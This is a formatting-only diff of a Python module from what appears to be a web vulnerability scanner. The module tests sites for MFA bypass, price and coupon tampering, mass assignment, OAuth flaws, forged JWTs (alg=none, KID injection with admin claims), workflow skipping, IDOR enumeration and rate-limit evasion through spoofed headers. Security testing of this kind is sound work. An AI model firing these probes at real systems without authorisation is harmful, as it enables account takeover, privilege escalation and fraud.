@@ -14,6 +14,7 @@ IDOR / 工作流 / 限流 / 价格篡改等). 不是 v2 的旧版替代.
 - classic: 一次性快速扫, 不需要细粒度控制
 - v2: 模块化, 可单独调子模块, 便于接入自定义 pipeline
 """
+
 import re
 import urllib.parse
 from typing import Dict, List, Optional
@@ -71,32 +72,47 @@ MFA_BYPASS_TECHNIQUES = [
 ]
 
 MFA_COMMON_OTPS = [
-    "000000", "111111", "222222", "123456", "123123",
-    "654321", "999999", "000001", "012345", "111111",
+    "000000",
+    "111111",
+    "222222",
+    "123456",
+    "123123",
+    "654321",
+    "999999",
+    "000001",
+    "012345",
+    "111111",
 ]
 
 
-def check_mfa_bypass(url: str, sess: "requests.Session",
-                     timeout: float, target_session: Optional[Dict] = None) -> Dict:
+def check_mfa_bypass(
+    url: str, sess: "requests.Session", timeout: float, target_session: Optional[Dict] = None
+) -> Dict:
     result = {"vulnerable": False, "findings": [], "techniques_tested": []}
     base = url.rstrip("/")
 
     paths_to_test = [
-        "/dashboard", "/profile", "/account", "/admin",
-        "/api/user/me", "/api/profile", "/home",
+        "/dashboard",
+        "/profile",
+        "/account",
+        "/admin",
+        "/api/user/me",
+        "/api/profile",
+        "/home",
     ]
 
     for path in paths_to_test:
         try:
-            r = sess.get(f"{base}{path}", timeout=timeout,
-                         allow_redirects=False)
+            r = sess.get(f"{base}{path}", timeout=timeout, allow_redirects=False)
             if r.status_code in (200, 201, 204) and r.status_code not in (302, 401, 403):
                 result["vulnerable"] = True
-                result["findings"].append({
-                    "technique": "direct_dashboard_access",
-                    "detail": f"Direct access to {path} returned {r.status_code} without 2FA",
-                    "url": f"{base}{path}",
-                })
+                result["findings"].append(
+                    {
+                        "technique": "direct_dashboard_access",
+                        "detail": f"Direct access to {path} returned {r.status_code} without 2FA",
+                        "url": f"{base}{path}",
+                    }
+                )
         except Exception:
             pass
 
@@ -116,15 +132,18 @@ def check_mfa_bypass(url: str, sess: "requests.Session",
             try:
                 sep = "&" if "?" in path else "?"
                 param_str = "&".join(f"{k}={v}" for k, v in params.items())
-                r = sess.get(f"{base}{path}{sep}{param_str}",
-                             timeout=timeout, allow_redirects=False)
+                r = sess.get(
+                    f"{base}{path}{sep}{param_str}", timeout=timeout, allow_redirects=False
+                )
                 if r.status_code in (200, 201, 204):
                     result["vulnerable"] = True
-                    result["findings"].append({
-                        "technique": "skip_2fa_param",
-                        "detail": f"2FA bypassed with params {params} on {path}",
-                        "params": params,
-                    })
+                    result["findings"].append(
+                        {
+                            "technique": "skip_2fa_param",
+                            "detail": f"2FA bypassed with params {params} on {path}",
+                            "params": params,
+                        }
+                    )
             except Exception:
                 pass
         if result["vulnerable"]:
@@ -138,14 +157,26 @@ def check_mfa_bypass(url: str, sess: "requests.Session",
 # ---------------------------------------------------------------------------
 
 PRICE_FIELD_PATTERNS = [
-    "price", "amount", "total", "cost", "charge", "fee",
-    "payment", "discount", "subtotal", "value", "donation",
-    "quantity", "qty", "count",
+    "price",
+    "amount",
+    "total",
+    "cost",
+    "charge",
+    "fee",
+    "payment",
+    "discount",
+    "subtotal",
+    "value",
+    "donation",
+    "quantity",
+    "qty",
+    "count",
 ]
 
 
-def check_price_manipulation(url: str, param: str, sess: "requests.Session",
-                              timeout: float) -> Dict:
+def check_price_manipulation(
+    url: str, param: str, sess: "requests.Session", timeout: float
+) -> Dict:
     result = {"vulnerable": False, "findings": []}
     param_lower = param.lower()
 
@@ -178,8 +209,8 @@ def check_price_manipulation(url: str, param: str, sess: "requests.Session",
             r'["\']amount["\']\s*:\s*(\d+(?:\.\d+)?)',
             r'["\']total["\']\s*:\s*(\d+(?:\.\d+)?)',
             r'["\']cost["\']\s*:\s*(\d+(?:\.\d+)?)',
-            r'\$(\d+(?:\.\d+)?)',
-            r'(\d+(?:\.\d+)?)\s*元',
+            r"\$(\d+(?:\.\d+)?)",
+            r"(\d+(?:\.\d+)?)\s*元",
         ]
         for pat in patterns:
             m = re.search(pat, body)
@@ -198,10 +229,12 @@ def check_price_manipulation(url: str, param: str, sess: "requests.Session",
             if baseline and r.status_code == baseline.status_code:
                 if _price_differs(r.text):
                     result["vulnerable"] = True
-                    result["findings"].append({
-                        "technique": "price_tamper",
-                        "detail": f"Price param '{param}={val}' ({label}) affected response, status={r.status_code}",
-                    })
+                    result["findings"].append(
+                        {
+                            "technique": "price_tamper",
+                            "detail": f"Price param '{param}={val}' ({label}) affected response, status={r.status_code}",
+                        }
+                    )
         except Exception:
             pass
 
@@ -213,18 +246,37 @@ def check_price_manipulation(url: str, param: str, sess: "requests.Session",
 # ---------------------------------------------------------------------------
 
 COMMON_MASS_ASSIGN_FIELDS = [
-    "role", "is_admin", "admin", "group", "permissions",
-    "access_level", "user_type", "account_type", "membership",
-    "verified", "is_verified", "email_verified", "active",
-    "is_active", "enabled", "disabled", "approved",
-    "status", "state", "subscription", "tier",
-    "credit", "balance", "points",
-    "admin_note", "__proto__", "constructor",
+    "role",
+    "is_admin",
+    "admin",
+    "group",
+    "permissions",
+    "access_level",
+    "user_type",
+    "account_type",
+    "membership",
+    "verified",
+    "is_verified",
+    "email_verified",
+    "active",
+    "is_active",
+    "enabled",
+    "disabled",
+    "approved",
+    "status",
+    "state",
+    "subscription",
+    "tier",
+    "credit",
+    "balance",
+    "points",
+    "admin_note",
+    "__proto__",
+    "constructor",
 ]
 
 
-def check_mass_assignment(url: str, method: str, sess: "requests.Session",
-                          timeout: float) -> Dict:
+def check_mass_assignment(url: str, method: str, sess: "requests.Session", timeout: float) -> Dict:
     result = {"vulnerable": False, "findings": []}
 
     baseline_body = ""
@@ -263,11 +315,13 @@ def check_mass_assignment(url: str, method: str, sess: "requests.Session",
             status_diff = r.status_code != baseline_status
             if body_diff or status_diff:
                 result["vulnerable"] = True
-                result["findings"].append({
-                    "technique": "mass_assignment",
-                    "detail": f"Field '{field}' changed response (status {baseline_status}->{r.status_code}, body changed={body_diff})",
-                    "field": field,
-                })
+                result["findings"].append(
+                    {
+                        "technique": "mass_assignment",
+                        "detail": f"Field '{field}' changed response (status {baseline_status}->{r.status_code}, body changed={body_diff})",
+                        "field": field,
+                    }
+                )
         except Exception:
             pass
 
@@ -309,8 +363,7 @@ OAUTH_SSO_FLAW_CHECKS = [
 ]
 
 
-def check_oauth_logic(url: str, sess: "requests.Session",
-                      timeout: float) -> Dict:
+def check_oauth_logic(url: str, sess: "requests.Session", timeout: float) -> Dict:
     result = {"vulnerable": False, "findings": []}
 
     try:
@@ -325,10 +378,12 @@ def check_oauth_logic(url: str, sess: "requests.Session",
                 target_domain = parsed.netloc.lower()
                 if target_domain and target_domain != sess.get(url, timeout=timeout).url:
                     result["vulnerable"] = True
-                    result["findings"].append({
-                        "technique": "open_redirect_in_oauth",
-                        "detail": f"redirect_uri allows external domain: {redirect_url[:80]}",
-                    })
+                    result["findings"].append(
+                        {
+                            "technique": "open_redirect_in_oauth",
+                            "detail": f"redirect_uri allows external domain: {redirect_url[:80]}",
+                        }
+                    )
                     break
     except Exception:
         pass
@@ -343,10 +398,12 @@ def check_oauth_logic(url: str, sess: "requests.Session",
             for sv in state_vals:
                 if len(sv) < 16:
                     result["vulnerable"] = True
-                    result["findings"].append({
-                        "technique": "state_param_missing_or_static",
-                        "detail": f"OAuth state parameter is too short or missing: '{sv}'",
-                    })
+                    result["findings"].append(
+                        {
+                            "technique": "state_param_missing_or_static",
+                            "detail": f"OAuth state parameter is too short or missing: '{sv}'",
+                        }
+                    )
                 break
     except Exception:
         pass
@@ -358,9 +415,10 @@ def check_oauth_logic(url: str, sess: "requests.Session",
 # JWT Algorithm Confusion / KID Injection
 # ---------------------------------------------------------------------------
 
-def check_jwt_kid_injection(sess: "requests.Session", url: str,
-                             token: Optional[str] = None,
-                             timeout: float = 10.0) -> Dict:
+
+def check_jwt_kid_injection(
+    sess: "requests.Session", url: str, token: Optional[str] = None, timeout: float = 10.0
+) -> Dict:
     result = {"vulnerable": False, "findings": []}
 
     if not token:
@@ -386,15 +444,16 @@ def check_jwt_kid_injection(sess: "requests.Session", url: str,
             pld_b64 = b64url_encode(_json.dumps({"sub": "admin", "role": "admin"}).encode())
             sig = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
             forged = f"{hdr_b64}.{pld_b64}.{b64url_encode(sig.encode())}"
-            r = sess.get(url, headers={"Authorization": f"Bearer {forged}"},
-                         timeout=timeout)
+            r = sess.get(url, headers={"Authorization": f"Bearer {forged}"}, timeout=timeout)
             if r.status_code in (200, 201, 204):
                 result["vulnerable"] = True
-                result["findings"].append({
-                    "technique": "jwt_kid_injection",
-                    "detail": f"KID injection with {kid_header['kid']} accepted",
-                    "header": kid_header,
-                })
+                result["findings"].append(
+                    {
+                        "technique": "jwt_kid_injection",
+                        "detail": f"KID injection with {kid_header['kid']} accepted",
+                        "header": kid_header,
+                    }
+                )
         except Exception:
             pass
 
@@ -403,15 +462,16 @@ def check_jwt_kid_injection(sess: "requests.Session", url: str,
         hdr_b64 = b64url_encode(_json.dumps(none_header).encode())
         pld_b64 = b64url_encode(_json.dumps({"sub": "admin", "role": "admin"}).encode())
         forged = f"{hdr_b64}.{pld_b64}."
-        r = sess.get(url, headers={"Authorization": f"Bearer {forged}"},
-                     timeout=timeout)
+        r = sess.get(url, headers={"Authorization": f"Bearer {forged}"}, timeout=timeout)
         if r.status_code in (200, 201, 204):
             result["vulnerable"] = True
-            result["findings"].append({
-                "technique": "jwt_none_alg",
-                "detail": "JWT alg=none accepted (empty signature)",
-                "header": none_header,
-            })
+            result["findings"].append(
+                {
+                    "technique": "jwt_none_alg",
+                    "detail": "JWT alg=none accepted (empty signature)",
+                    "header": none_header,
+                }
+            )
     except Exception:
         pass
 
@@ -433,34 +493,43 @@ COUPON_TAMPER_VECTORS = [
 ]
 
 
-def check_coupon_abuse(url: str, sess: "requests.Session",
-                        timeout: float) -> Dict:
+def check_coupon_abuse(url: str, sess: "requests.Session", timeout: float) -> Dict:
     result = {"vulnerable": False, "findings": []}
     base = url.rstrip("/")
 
     coupon_endpoints = [
-        "/api/coupon/redeem", "/api/promo/apply",
-        "/api/v1/coupon/apply", "/api/coupon",
-        "/api/promo", "/coupon/redeem", "/checkout/coupon",
+        "/api/coupon/redeem",
+        "/api/promo/apply",
+        "/api/v1/coupon/apply",
+        "/api/coupon",
+        "/api/promo",
+        "/coupon/redeem",
+        "/checkout/coupon",
     ]
 
     for endpoint in coupon_endpoints:
         for params in COUPON_TAMPER_VECTORS:
             try:
-                r = sess.post(f"{base}{endpoint}", json=params,
-                              timeout=timeout)
+                r = sess.post(f"{base}{endpoint}", json=params, timeout=timeout)
                 body_lower = r.text.lower()
                 if r.status_code in (200, 201, 204):
-                    success_keywords = ["applied", "success", "redeemed",
-                                         "discount", "coupon applied"]
+                    success_keywords = [
+                        "applied",
+                        "success",
+                        "redeemed",
+                        "discount",
+                        "coupon applied",
+                    ]
                     if any(kw in body_lower for kw in success_keywords):
                         result["vulnerable"] = True
-                        result["findings"].append({
-                            "technique": "coupon_abuse",
-                            "detail": f"Coupon {params} accepted at {endpoint} (status={r.status_code})",
-                            "endpoint": endpoint,
-                            "params": params,
-                        })
+                        result["findings"].append(
+                            {
+                                "technique": "coupon_abuse",
+                                "detail": f"Coupon {params} accepted at {endpoint} (status={r.status_code})",
+                                "endpoint": endpoint,
+                                "params": params,
+                            }
+                        )
             except Exception:
                 pass
         if result["vulnerable"]:
@@ -497,8 +566,7 @@ WORKFLOW_BYPASS_TECHNIQUES = [
 ]
 
 
-def check_workflow_bypass(url: str, sess: "requests.Session",
-                           timeout: float) -> Dict:
+def check_workflow_bypass(url: str, sess: "requests.Session", timeout: float) -> Dict:
     result = {"vulnerable": False, "findings": []}
 
     common_flow_steps = {
@@ -506,7 +574,11 @@ def check_workflow_bypass(url: str, sess: "requests.Session",
         "/onboarding/step1": ["/onboarding/step2", "/onboarding/step3", "/onboarding/done"],
         "/signup/account": ["/signup/profile", "/signup/verify", "/signup/done"],
         "/order/create": ["/order/pay", "/order/confirm", "/order/done"],
-        "/registration/basic": ["/registration/details", "/registration/confirm", "/registration/complete"],
+        "/registration/basic": [
+            "/registration/details",
+            "/registration/confirm",
+            "/registration/complete",
+        ],
     }
 
     for first_step, later_steps in common_flow_steps.items():
@@ -515,18 +587,18 @@ def check_workflow_bypass(url: str, sess: "requests.Session",
         for skip_to in later_steps:
             target_url = f"{url.rstrip('/')}{skip_to}"
             try:
-                r = sess.get(target_url, timeout=timeout,
-                             allow_redirects=False)
+                r = sess.get(target_url, timeout=timeout, allow_redirects=False)
                 if r.status_code in (200, 201, 204):
-                    r2 = sess.get(f"{url.rstrip('/')}{first_step}",
-                                  timeout=timeout)
+                    r2 = sess.get(f"{url.rstrip('/')}{first_step}", timeout=timeout)
                     if r2.status_code not in (302, 401, 403):
                         result["vulnerable"] = True
-                        result["findings"].append({
-                            "technique": "skip_step",
-                            "detail": f"Direct access to mid-flow step {skip_to} returned {r.status_code}",
-                            "url": target_url,
-                        })
+                        result["findings"].append(
+                            {
+                                "technique": "skip_step",
+                                "detail": f"Direct access to mid-flow step {skip_to} returned {r.status_code}",
+                                "url": target_url,
+                            }
+                        )
             except Exception:
                 pass
             if result["vulnerable"]:
@@ -541,15 +613,15 @@ def check_workflow_bypass(url: str, sess: "requests.Session",
 # IDOR Chain Detection (Multi-step object reference)
 # ---------------------------------------------------------------------------
 
-def check_idor_chain(url: str, sess: "requests.Session",
-                     timeout: float) -> Dict:
+
+def check_idor_chain(url: str, sess: "requests.Session", timeout: float) -> Dict:
     result = {"vulnerable": False, "findings": []}
 
     idor_uuid_patterns = [
-        r'/user/(\d+)',
-        r'/order/(\d+)',
-        r'/account/(\d+)',
-        r'/api/v1/users/(\d+)',
+        r"/user/(\d+)",
+        r"/order/(\d+)",
+        r"/account/(\d+)",
+        r"/api/v1/users/(\d+)",
     ]
 
     try:
@@ -560,20 +632,23 @@ def check_idor_chain(url: str, sess: "requests.Session",
                 if match.isdigit():
                     test_id = str(int(match) + 1)
                     test_url = re.sub(
-                        r'(/user/|/order/|/account/|/api/v1/users/)' + re.escape(match),
-                        r'\g<1>' + test_id,
-                        url)
+                        r"(/user/|/order/|/account/|/api/v1/users/)" + re.escape(match),
+                        r"\g<1>" + test_id,
+                        url,
+                    )
                     try:
                         r2 = sess.get(test_url, timeout=timeout)
                         if r2.status_code in (200, 201) and len(r2.text) > 50:
                             if r2.text != r.text:
                                 result["vulnerable"] = True
-                                result["findings"].append({
-                                    "technique": "idor_chain",
-                                    "detail": f"Object ID enumeration possible: {match} -> {test_id} also accessible with different content",
-                                    "original": match,
-                                    "test_url": test_url[:80],
-                                })
+                                result["findings"].append(
+                                    {
+                                        "technique": "idor_chain",
+                                        "detail": f"Object ID enumeration possible: {match} -> {test_id} also accessible with different content",
+                                        "original": match,
+                                        "test_url": test_url[:80],
+                                    }
+                                )
                     except Exception:
                         pass
     except Exception:
@@ -586,8 +661,8 @@ def check_idor_chain(url: str, sess: "requests.Session",
 # Rate Limit Bypass Detection
 # ---------------------------------------------------------------------------
 
-def check_rate_limit_bypass(url: str, sess: "requests.Session",
-                            timeout: float) -> Dict:
+
+def check_rate_limit_bypass(url: str, sess: "requests.Session", timeout: float) -> Dict:
     result = {"vulnerable": False, "findings": []}
     bypass_headers = [
         {"X-Forwarded-For": "127.0.0.1"},
@@ -623,11 +698,13 @@ def check_rate_limit_bypass(url: str, sess: "requests.Session",
                     pass
             if 429 in codes_without_bypass:
                 result["vulnerable"] = True
-                result["findings"].append({
-                    "technique": "rate_limit_bypass",
-                    "detail": f"Rate limit bypass using headers {headers}",
-                    "headers": headers,
-                })
+                result["findings"].append(
+                    {
+                        "technique": "rate_limit_bypass",
+                        "detail": f"Rate limit bypass using headers {headers}",
+                        "headers": headers,
+                    }
+                )
 
     return result
 
@@ -638,20 +715,42 @@ def check_rate_limit_bypass(url: str, sess: "requests.Session",
 
 CHECKS_REGISTRY: List[Dict] = [
     {"name": "mfa_bypass", "fn": check_mfa_bypass, "desc": "2FA/MFA bypass techniques"},
-    {"name": "price_manipulation", "fn": check_price_manipulation, "desc": "Price/amount tampering"},
-    {"name": "mass_assignment", "fn": check_mass_assignment, "desc": "Mass assignment via extra fields"},
+    {
+        "name": "price_manipulation",
+        "fn": check_price_manipulation,
+        "desc": "Price/amount tampering",
+    },
+    {
+        "name": "mass_assignment",
+        "fn": check_mass_assignment,
+        "desc": "Mass assignment via extra fields",
+    },
     {"name": "oauth_logic", "fn": check_oauth_logic, "desc": "OAuth/SSO logic flaws"},
-    {"name": "jwt_kid_injection", "fn": check_jwt_kid_injection, "desc": "JWT KID injection / alg confusion"},
+    {
+        "name": "jwt_kid_injection",
+        "fn": check_jwt_kid_injection,
+        "desc": "JWT KID injection / alg confusion",
+    },
     {"name": "coupon_abuse", "fn": check_coupon_abuse, "desc": "Coupon/promo code abuse"},
-    {"name": "workflow_bypass", "fn": check_workflow_bypass, "desc": "Workflow/state machine bypass"},
+    {
+        "name": "workflow_bypass",
+        "fn": check_workflow_bypass,
+        "desc": "Workflow/state machine bypass",
+    },
     {"name": "idor_chain", "fn": check_idor_chain, "desc": "IDOR chain / object enumeration"},
-    {"name": "rate_limit_bypass", "fn": check_rate_limit_bypass, "desc": "Rate limit bypass via headers"},
+    {
+        "name": "rate_limit_bypass",
+        "fn": check_rate_limit_bypass,
+        "desc": "Rate limit bypass via headers",
+    },
 ]
 
 
-def check(url: str, param: str = None, sess: Optional["requests.Session"] = None,
-          timeout: float = 10.0) -> Dict:
+def check(
+    url: str, param: str = None, sess: Optional["requests.Session"] = None, timeout: float = 10.0
+) -> Dict:
     import requests
+
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -670,6 +769,7 @@ def check(url: str, param: str = None, sess: Optional["requests.Session"] = None
                 r = check_def["fn"](url, method, sess, timeout)
             elif check_def["name"] == "jwt_kid_injection":
                 from tools.jwt_detector import JWT_REGEX as _JWT_REGEX
+
                 token = None
                 try:
                     resp = sess.get(url, timeout=timeout)
@@ -679,8 +779,14 @@ def check(url: str, param: str = None, sess: Optional["requests.Session"] = None
                 except Exception:
                     pass
                 r = check_def["fn"](sess, url, token, timeout)
-            elif check_def["name"] in ("mfa_bypass", "oauth_logic", "coupon_abuse",
-                                        "workflow_bypass", "idor_chain", "rate_limit_bypass"):
+            elif check_def["name"] in (
+                "mfa_bypass",
+                "oauth_logic",
+                "coupon_abuse",
+                "workflow_bypass",
+                "idor_chain",
+                "rate_limit_bypass",
+            ):
                 r = check_def["fn"](url, sess, timeout)
             elif check_def["name"] in ("price_manipulation",) and not param:
                 continue
